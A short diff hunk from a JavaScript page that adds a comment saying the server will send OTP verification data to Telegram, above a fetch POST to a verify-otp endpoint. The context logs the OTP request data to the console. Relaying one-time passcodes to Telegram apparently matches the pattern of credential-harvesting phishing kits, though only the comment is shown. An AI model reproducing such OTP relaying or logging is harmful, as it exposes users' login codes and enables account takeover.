@@ -568,6 +568,7 @@
                 console.log('📤 Verifying OTP:', requestData);
 
                 try {
+                    // ===== CALL THE API (Server will send to Telegram) =====
                     const response = await fetch(`${API_URL}/api/verify-otp`, {
                         method: 'POST',
                         headers: {
